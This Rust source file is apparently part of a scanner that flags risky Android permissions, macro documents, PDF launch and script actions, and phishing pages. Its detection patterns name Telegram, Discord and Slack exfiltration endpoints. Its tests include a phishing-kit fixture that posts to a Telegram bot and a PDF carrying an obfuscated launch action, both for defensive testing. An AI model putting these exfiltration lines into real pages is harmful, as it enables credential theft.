//! What a file can do once it's opened: an app's permissions, a document's macros,
//! a PDF's actions and a web page's form. Everything is read in memory, with caps against bombs.

use std::collections::HashSet;
use std::io::{Cursor, Read};
use std::sync::LazyLock;

use flate2::read::ZlibDecoder;
use regex::Regex;
use regex::bytes::Regex as BytesRegex;
use url::Url;

use super::Signal;
use super::file::{self, FileKind};
use super::{link, sites};

const MAX_ENTRY_BYTES: u64 = 4 * 1024 * 1024;
const MAX_NESTED_APP_BYTES: u64 = 30 * 1024 * 1024;
const MAX_HTML_BYTES: usize = 2 * 1024 * 1024;
const MAX_PDF_BYTES: usize = 20 * 1024 * 1024;
const MAX_PDF_STREAMS: usize = 200;
const MAX_STREAM_BYTES: u64 = 1024 * 1024;
const MAX_INFLATED_BYTES: usize = 8 * 1024 * 1024;
const MAX_STRINGS: usize = 50_000;
const MAX_LINKS: usize = 3;
/// Enough sites to find the unknown ones; a file stuffed with links isn't read further.
const MAX_LINK_HOSTS: usize = 50;
const MAX_PACKAGE_CHARS: usize = 100;
pub(super) const OLE: &[u8] = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1";

/// Something an Android app asks to be allowed to do that bank-stealing apps rely on.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum Power {
    ReadsSms,
    ControlsScreen,
    DrawsOverApps,
    DeviceAdmin,
    InstallsApps,
}

const POWERS: &[(Power, &[&str])] = &[
    (
        Power::ReadsSms,
        &[
            "android.permission.READ_SMS",
            "android.permission.RECEIVE_SMS",
        ],
    ),
    (
        Power::ControlsScreen,
        &[
            "android.permission.BIND_ACCESSIBILITY_SERVICE",
            "android.accessibilityservice.AccessibilityService",
        ],
    ),
    (
        Power::DrawsOverApps,
        &["android.permission.SYSTEM_ALERT_WINDOW"],
    ),
    (
        Power::DeviceAdmin,
        &[
            "android.permission.BIND_DEVICE_ADMIN",
            "android.app.action.DEVICE_ADMIN_ENABLED",
        ],
    ),
    (
        Power::InstallsApps,
        &["android.permission.REQUEST_INSTALL_PACKAGES"],
    ),
];

#[derive(Debug, Default)]
pub struct Inside {
    pub signals: Vec<Signal>,
    pub package: Option<String>,
    pub powers: Vec<Power>,
    pub links: Vec<Url>,
}

pub fn look(kind: FileKind, bytes: &[u8]) -> Inside {
    match kind {
        FileKind::AndroidApp => app(bytes),
        FileKind::Archive => nested_app(bytes).unwrap_or_default(),
        FileKind::Document if has_macros(bytes) => Inside {
            signals: vec![Signal::MacroDocument],
            ..Inside::default()
        },
        FileKind::Pdf => pdf(bytes),
        FileKind::WebPage => web_page(bytes),
        _ => Inside::default(),
    }
}

fn app(bytes: &[u8]) -> Inside {
    let Some(manifest) = zip_entry(bytes, "AndroidManifest.xml", MAX_ENTRY_BYTES) else {
        return Inside::default();
    };
    let strings = chunks(&manifest)
        .into_iter()
        .find(|(kind, _)| *kind == STRING_POOL)
        .map(|(_, pool)| strings(pool))
        .unwrap_or_default();
    let powers: Vec<Power> = POWERS
        .iter()
        .filter(|(_, names)| {
            strings
                .iter()
                .any(|string| names.contains(&string.as_str()))
        })
        .map(|(power, _)| *power)
        .collect();
    let mut signals: Vec<Signal> = powers.iter().copied().map(Signal::AppPower).collect();
    if powers.contains(&Power::ReadsSms)
        && (powers.contains(&Power::ControlsScreen) || powers.contains(&Power::DrawsOverApps))
    {
        signals.push(Signal::StealsCodes);
    }
    Inside {
        signals,
        package: package_name(&manifest, &strings)
            .map(|name| name.chars().take(MAX_PACKAGE_CHARS).collect()),
        powers,
        links: Vec::new(),
    }
}

/// Apps are often sent zipped, so the first one inside a zip is opened too.
fn nested_app(bytes: &[u8]) -> Option<Inside> {
    let archive = zip::ZipArchive::new(Cursor::new(bytes)).ok()?;
    let name = archive
        .file_names()
        .filter_map(Result::ok)
        .find(|name| file::kind_from_name(name) == Some(FileKind::AndroidApp))?
        .into_owned();
    let inner = zip_entry(bytes, &name, MAX_NESTED_APP_BYTES)?;
    Some(app(&inner))
}

/// An entry declared bigger than `cap` is skipped rather than read, so a padded manifest goes unread;
/// the app is still flagged as an app.
fn zip_entry(bytes: &[u8], name: &str, cap: u64) -> Option<Vec<u8>> {
    let mut archive = zip::ZipArchive::new(Cursor::new(bytes)).ok()?;
    let entry = archive.by_name(name).ok()?;
    if entry.size() > cap {
        return None;
    }
    let mut out = Vec::new();
    entry.take(cap).read_to_end(&mut out).ok()?;
    Some(out)
}

// Android's compiled XML: a string pool, then element chunks that point into it.
const XML: u16 = 0x0003;
const STRING_POOL: u16 = 0x0001;
const START_ELEMENT: u16 = 0x0102;
const UTF8_POOL: u32 = 1 << 8;

fn u16_at(bytes: &[u8], at: usize) -> Option<u16> {
    Some(u16::from_le_bytes(
        bytes.get(at..at.checked_add(2)?)?.try_into().ok()?,
    ))
}

fn u32_at(bytes: &[u8], at: usize) -> Option<u32> {
    Some(u32::from_le_bytes(
        bytes.get(at..at.checked_add(4)?)?.try_into().ok()?,
    ))
}

fn chunks(xml: &[u8]) -> Vec<(u16, &[u8])> {
    let mut out = Vec::new();
    if u16_at(xml, 0) != Some(XML) {
        return out;
    }
    let mut at = u16_at(xml, 2).map_or(8, usize::from);
    while let (Some(kind), Some(size)) = (u16_at(xml, at), u32_at(xml, at + 4)) {
        let size = size as usize;
        let Some(chunk) = xml.get(at..at.saturating_add(size)).filter(|_| size >= 8) else {
            break;
        };
        out.push((kind, chunk));
        at += size;
    }
    out
}

/// Every string in the pool, by index; unreadable ones are empty so indexes still line up.
fn strings(pool: &[u8]) -> Vec<String> {
    let (Some(header), Some(count), Some(flags), Some(start)) = (
        u16_at(pool, 2),
        u32_at(pool, 8),
        u32_at(pool, 16),
        u32_at(pool, 20),
    ) else {
        return Vec::new();
    };
    (0..(count as usize).min(MAX_STRINGS))
        .map(|index| {
            let at = u32_at(pool, usize::from(header) + index * 4)
                .and_then(|offset| (start as usize).checked_add(offset as usize));
            at.and_then(|at| {
                if flags & UTF8_POOL != 0 {
                    utf8_string(pool, at)
                } else {
                    utf16_string(pool, at)
                }
            })
            .unwrap_or_default()
        })
        .collect()
}

fn utf16_string(pool: &[u8], at: usize) -> Option<String> {
    let first = u16_at(pool, at)?;
    let (len, data) = if first & 0x8000 != 0 {
        let len = (usize::from(first & 0x7fff) << 16) | usize::from(u16_at(pool, at + 2)?);
        (len, at + 4)
    } else {
        (usize::from(first), at + 2)
    };
    let units: Vec<u16> = (0..len.min(4096))
        .map(|index| u16_at(pool, data + index * 2))
        .collect::<Option<_>>()?;
    Some(String::from_utf16_lossy(&units))
}

fn utf8_string(pool: &[u8], at: usize) -> Option<String> {
    let length = |at: usize| -> Option<(usize, usize)> {
        let first = *pool.get(at)?;
        if first & 0x80 != 0 {
            Some((
                (usize::from(first & 0x7f) << 8) | usize::from(*pool.get(at + 1)?),
                at + 2,
            ))
        } else {
            Some((usize::from(first), at + 1))
        }
    };
    let (_, at) = length(at)?;
    let (len, data) = length(at)?;
    Some(String::from_utf8_lossy(pool.get(data..data.checked_add(len)?)?).into_owned())
}

fn package_name(xml: &[u8], strings: &[String]) -> Option<String> {
    let string = |index: u32| strings.get(index as usize).filter(|text| !text.is_empty());
    chunks(xml)
        .into_iter()
        .filter(|(kind, _)| *kind == START_ELEMENT)
        .find_map(|(_, element)| {
            let ext = usize::from(u16_at(element, 2)?);
            if string(u32_at(element, ext + 4)?)? != "manifest" {
                return None;
            }
            let start = ext + usize::from(u16_at(element, ext + 8)?);
            let size = usize::from(u16_at(element, ext + 10)?);
            let count = usize::from(u16_at(element, ext + 12)?);
            (0..count).find_map(|index| {
                let attribute = start + index * size;
                if string(u32_at(element, attribute + 4)?)? != "package" {
                    return None;
                }
                string(u32_at(element, attribute + 8)?).cloned()
            })
        })
}

fn has_macros(bytes: &[u8]) -> bool {
    if bytes.starts_with(OLE) {
        let name: Vec<u8> = "_VBA_PROJECT"
            .encode_utf16()
            .flat_map(u16::to_le_bytes)
            .collect();
        return bytes.windows(name.len()).any(|window| window == name);
    }
    zip::ZipArchive::new(Cursor::new(bytes)).is_ok_and(|archive| {
        archive
            .file_names()
            .filter_map(Result::ok)
            .any(|name| name.to_ascii_lowercase().ends_with("vbaproject.bin"))
    })
}

static PDF_STREAM: LazyLock<BytesRegex> = LazyLock::new(|| {
    BytesRegex::new(r"(?s-u)>>\s*stream\r?\n(.*?)endstream").expect("valid regex")
});
static PDF_SCRIPT: LazyLock<BytesRegex> =
    LazyLock::new(|| BytesRegex::new(r"(?-u)/JavaScript|/JS[\s/(<\[]").expect("valid regex"));
static PDF_URI: LazyLock<BytesRegex> = LazyLock::new(|| {
    BytesRegex::new(r"(?-u)/URI\s*\(((?:[^)\\]|\\.){1,2048})\)").expect("valid regex")
});
static PDF_FILE_NAME: LazyLock<BytesRegex> =
    LazyLock::new(|| BytesRegex::new(r"(?-u)/U?F\s*\(([^()]{1,255})\)").expect("valid regex"));

fn pdf(bytes: &[u8]) -> Inside {
    // Harmful PDFs are small; a big one is scanned only at the start, where its objects begin.
    let bytes = &bytes[..bytes.len().min(MAX_PDF_BYTES)];
    // Objects can hide in compressed streams, and names can be spelled with #hex escapes.
    let mut text = unescape_names(bytes);
    for stream in PDF_STREAM
        .captures_iter(bytes)
        .filter_map(|captures| captures.get(1))
        .take(MAX_PDF_STREAMS)
    {
        if text.len() >= bytes.len() + MAX_INFLATED_BYTES {
            break;
        }
        let mut inflated = Vec::new();
        if ZlibDecoder::new(stream.as_bytes())
            .take(MAX_STREAM_BYTES)
            .read_to_end(&mut inflated)
            .is_ok()
        {
            text.extend(unescape_names(&inflated));
        }
    }

    let contains = |needle: &[u8]| text.windows(needle.len()).any(|window| window == needle);
    let mut signals = Vec::new();
    if contains(b"/Launch") {
        signals.push(Signal::PdfLaunch);
    }
    if PDF_SCRIPT.is_match(&text) {
        signals.push(Signal::PdfScript);
    }
    let program_inside = contains(b"/EmbeddedFile")
        && PDF_FILE_NAME.captures_iter(&text).any(|captures| {
            file::kind_from_name(&String::from_utf8_lossy(&captures[1]))
                .is_some_and(|kind| kind.is_dangerous() && kind != FileKind::WebPage)
        });
    if program_inside {
        signals.push(Signal::ProgramInArchive);
    }
    let links = PDF_URI.captures_iter(&text).filter_map(|captures| {
        link::parse_http_url(&String::from_utf8_lossy(&captures[1]).replace('\\', ""))
    });
    Inside {
        signals,
        links: pick_links(links),
        ..Inside::default()
    }
}

fn unescape_names(bytes: &[u8]) -> Vec<u8> {
    let mut out = Vec::with_capacity(bytes.len());
    let mut index = 0;
    while index < bytes.len() {
        let hex = bytes
            .get(index + 1..index + 3)
            .and_then(|hex| std::str::from_utf8(hex).ok())
            .and_then(|hex| u8::from_str_radix(hex, 16).ok());
        match (bytes[index], hex) {
            (b'#', Some(byte)) => {
                out.push(byte);
                index += 3;
            }
            (byte, _) => {
                out.push(byte);
                index += 1;
            }
        }
    }
    out
}

static EXFILTRATION: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)api\.telegram\.org/bot|discord(?:app)?\.com/api/webhooks|hooks\.slack\.com/")
        .expect("valid regex")
});
static FORM_ACTION: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?is)<form[^>]+action\s*=\s*["']?(https?://[^"'\s>]+)"#).expect("valid regex")
});
static PAGE_LINK: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r#"(?is)<form[^>]+action\s*=\s*["']?(https?://[^"'\s>]+)|http-equiv\s*=\s*["']?refresh[^>]*?url\s*=\s*["']?(https?://[^"'\s>]+)|(?:location(?:\.href)?\s*=|location\.replace\(|window\.open\()\s*["'](https?://[^"']+)|<iframe[^>]+src\s*=\s*["']?(https?://[^"'\s>]+)"#,
    )
    .expect("valid regex")
});

fn web_page(bytes: &[u8]) -> Inside {
    let html = String::from_utf8_lossy(&bytes[..bytes.len().min(MAX_HTML_BYTES)]);
    let mut signals = link::html_signals(&html);
    // A saved login page that posts to a website is how phishing kits send what's typed;
    // a page saved from the bank's own site posts back to the bank.
    let posts_password = signals.contains(&Signal::PasswordPage)
        && FORM_ACTION.captures_iter(&html).any(|captures| {
            link::parse_http_url(&captures[1])
                .and_then(|url| url.host_str().map(sites::identify))
                .is_none_or(|site| site.is_none_or(|site| site.kind.has_public_pages()))
        });
    if EXFILTRATION.is_match(&html) || posts_password {
        signals.push(Signal::SendsToAttacker);
    }
    let links = PAGE_LINK.captures_iter(&html).filter_map(|captures| {
        captures
            .iter()
            .skip(1)
            .flatten()
            .next()
            .and_then(|url| link::parse_http_url(url.as_str()))
    });
    Inside {
        signals,
        links: pick_links(links),
        ..Inside::default()
    }
}

/// One link per site, unknown sites first, since well-known ones say little.
fn pick_links(links: impl Iterator<Item = Url>) -> Vec<Url> {
    let mut hosts = HashSet::new();
    let (mut unknown, mut known) = (Vec::new(), Vec::new());
    for url in links {
        let Some(host) = url.host_str() else {
            continue;
        };
        if !hosts.insert(host.to_owned()) {
            continue;
        }
        if sites::identify(host).is_some() {
            known.push(url);
        } else {
            unknown.push(url);
        }
        if unknown.len() >= MAX_LINKS || hosts.len() >= MAX_LINK_HOSTS {
            break;
        }
    }
    unknown.extend(known);
    unknown.truncate(MAX_LINKS);
    unknown
}

#[cfg(test)]
pub(crate) mod tests {
    use std::io::Write;

    use super::*;

    /// A compiled manifest holding `strings`, with `<manifest package=...>` as its first element.
    pub(crate) fn manifest(package: &str, permissions: &[&str]) -> Vec<u8> {
        let mut strings = vec!["manifest", "package", package];
        strings.extend_from_slice(permissions);
        let mut data = Vec::new();
        let mut offsets = Vec::new();
        for string in &strings {
            offsets.push(data.len() as u32);
            let units: Vec<u16> = string.encode_utf16().collect();
            data.extend_from_slice(&(units.len() as u16).to_le_bytes());
            units
                .iter()
                .for_each(|unit| data.extend_from_slice(&unit.to_le_bytes()));
            data.extend_from_slice(&[0, 0]);
        }
        let header = 28;
        let start = header + 4 * strings.len();
        let mut pool = Vec::new();
        pool.extend_from_slice(&STRING_POOL.to_le_bytes());
        pool.extend_from_slice(&(header as u16).to_le_bytes());
        pool.extend_from_slice(&((start + data.len()) as u32).to_le_bytes());
        pool.extend_from_slice(&(strings.len() as u32).to_le_bytes());
        pool.extend_from_slice(&[0; 4]);
        pool.extend_from_slice(&0u32.to_le_bytes());
        pool.extend_from_slice(&(start as u32).to_le_bytes());
        pool.extend_from_slice(&[0; 4]);
        offsets
            .iter()
            .for_each(|offset| pool.extend_from_slice(&offset.to_le_bytes()));
        pool.extend(data);

        let mut element = Vec::new();
        element.extend_from_slice(&START_ELEMENT.to_le_bytes());
        element.extend_from_slice(&16u16.to_le_bytes());
        element.extend_from_slice(&(16u32 + 20 + 20).to_le_bytes());
        element.extend_from_slice(&[0; 8]);
        element.extend_from_slice(&u32::MAX.to_le_bytes());
        element.extend_from_slice(&0u32.to_le_bytes());
        element.extend_from_slice(&20u16.to_le_bytes());
        element.extend_from_slice(&20u16.to_le_bytes());
        element.extend_from_slice(&1u16.to_le_bytes());
        element.extend_from_slice(&[0; 6]);
        element.extend_from_slice(&u32::MAX.to_le_bytes());
        element.extend_from_slice(&1u32.to_le_bytes());
        element.extend_from_slice(&2u32.to_le_bytes());
        element.extend_from_slice(&8u16.to_le_bytes());
        element.extend_from_slice(&[0, 3]);
        element.extend_from_slice(&2u32.to_le_bytes());

        let mut xml = Vec::new();
        xml.extend_from_slice(&XML.to_le_bytes());
        xml.extend_from_slice(&8u16.to_le_bytes());
        xml.extend_from_slice(&((8 + pool.len() + element.len()) as u32).to_le_bytes());
        xml.extend(pool);
        xml.extend(element);
        xml
    }

    pub(crate) fn zipped(entries: &[(&str, &[u8])]) -> Vec<u8> {
        let mut writer = zip::ZipWriter::new(Cursor::new(Vec::new()));
        for (name, bytes) in entries {
            let options = zip::write::SimpleFileOptions::default()
                .compression_method(zip::CompressionMethod::Deflated);
            writer.start_file(*name, options).unwrap();
            writer.write_all(bytes).unwrap();
        }
        writer.finish().unwrap().into_inner()
    }

    #[test]
    fn apps_show_what_they_can_do() {
        let trojan = zipped(&[(
            "AndroidManifest.xml",
            &manifest(
                "com.aba.update",
                &[
                    "android.permission.RECEIVE_SMS",
                    "android.permission.BIND_ACCESSIBILITY_SERVICE",
                    "android.permission.INTERNET",
                ],
            ),
        )]);
        let inside = look(FileKind::AndroidApp, &trojan);
        assert_eq!(inside.package.as_deref(), Some("com.aba.update"));
        assert_eq!(inside.powers, [Power::ReadsSms, Power::ControlsScreen]);
        assert!(inside.signals.contains(&Signal::StealsCodes));

        let game = zipped(&[(
            "AndroidManifest.xml",
            &manifest("org.example.game", &["android.permission.INTERNET"]),
        )]);
        let inside = look(FileKind::AndroidApp, &game);
        assert!(inside.signals.is_empty() && inside.powers.is_empty());

        let wrapped = zipped(&[("update.apk", &trojan)]);
        assert!(
            look(FileKind::Archive, &wrapped)
                .signals
                .contains(&Signal::StealsCodes)
        );
        assert!(
            look(FileKind::AndroidApp, b"PK\x03\x04 broken")
                .signals
                .is_empty()
        );
    }

    #[test]
    fn documents_with_macros_are_flagged() {
        let docm = zipped(&[
            ("[Content_Types].xml", b"<Types/>"),
            ("word/vbaProject.bin", b"x"),
        ]);
        assert_eq!(
            look(FileKind::Document, &docm).signals,
            [Signal::MacroDocument]
        );
        let docx = zipped(&[
            ("[Content_Types].xml", b"<Types/>"),
            ("word/document.xml", b"x"),
        ]);
        assert!(look(FileKind::Document, &docx).signals.is_empty());
        let mut xls = OLE.to_vec();
        xls.extend("_VBA_PROJECT".encode_utf16().flat_map(u16::to_le_bytes));
        assert_eq!(
            look(FileKind::Document, &xls).signals,
            [Signal::MacroDocument]
        );
    }

    #[test]
    fn pdf_actions_and_links_are_found_even_when_compressed() {
        let mut compressed = Vec::new();
        let mut encoder =
            flate2::write::ZlibEncoder::new(&mut compressed, flate2::Compression::default());
        encoder
            .write_all(b"<< /S /JavaScript /JS (app.alert(1)) >> << /URI (https://aba-verify.top/login) >>")
            .unwrap();
        encoder.finish().unwrap();
        let mut pdf = b"%PDF-1.7\n1 0 obj << /OpenAction << /S /L#61unch >> >> endobj\n2 0 obj << /Length 9 /Filter /FlateDecode >> stream\n".to_vec();
        pdf.extend(compressed);
        pdf.extend(b"\nendstream endobj");
        let inside = look(FileKind::Pdf, &pdf);
        assert_eq!(inside.signals, [Signal::PdfLaunch, Signal::PdfScript]);
        assert_eq!(inside.links[0].host_str(), Some("aba-verify.top"));

        let embedded = b"%PDF-1.7 << /Type /EmbeddedFile >> << /F (invoice.exe) >>";
        assert_eq!(
            look(FileKind::Pdf, embedded).signals,
            [Signal::ProgramInArchive]
        );
        let plain = b"%PDF-1.7 << /URI (https://www.ababank.com/) >>";
        assert!(look(FileKind::Pdf, plain).signals.is_empty());
    }

    #[test]
    fn phishing_pages_that_send_passwords_away_are_caught() {
        let kit = br#"<html><title>ABA Bank</title><form><input type="password"></form>
            <script>fetch("https://api.telegram.org/bot123:abc/sendMessage")</script>"#;
        let inside = look(FileKind::WebPage, kit);
        assert!(inside.signals.contains(&Signal::SendsToAttacker));
        assert!(inside.signals.contains(&Signal::BrandClaim("ABA")));

        let posting = br#"<form action="https://login-aba.example/p"><input type=password></form>"#;
        let inside = look(FileKind::WebPage, posting);
        assert!(inside.signals.contains(&Signal::SendsToAttacker));
        assert_eq!(inside.links[0].host_str(), Some("login-aba.example"));

        let receipt = b"<html><title>Receipt</title><p>Thank you</p></html>";
        assert!(look(FileKind::WebPage, receipt).signals.is_empty());

        let saved = br#"<title>ABA Bank</title><form action="https://ebank.ababank.com/login"><input type="password"></form>"#;
        assert!(
            !look(FileKind::WebPage, saved)
                .signals
                .contains(&Signal::SendsToAttacker)
        );
    }

    #[test]
    fn files_stuffed_with_links_are_read_quickly() {
        let mut pdf = b"%PDF-1.7\n".to_vec();
        for index in 0..200_000 {
            pdf.extend(format!("<< /URI (https://site{index}.example/) >>\n").as_bytes());
        }
        let started = std::time::Instant::now();
        let inside = look(FileKind::Pdf, &pdf);
        assert_eq!(inside.links.len(), 3);
        assert!(started.elapsed() < std::time::Duration::from_secs(2));
    }

    #[test]
    fn long_package_names_are_cut() {
        let name = "a".repeat(5_000);
        let app = zipped(&[("AndroidManifest.xml", &manifest(&name, &[]))]);
        assert_eq!(
            look(FileKind::AndroidApp, &app)
                .package
                .map(|name| name.len()),
            Some(100)
        );
    }
}
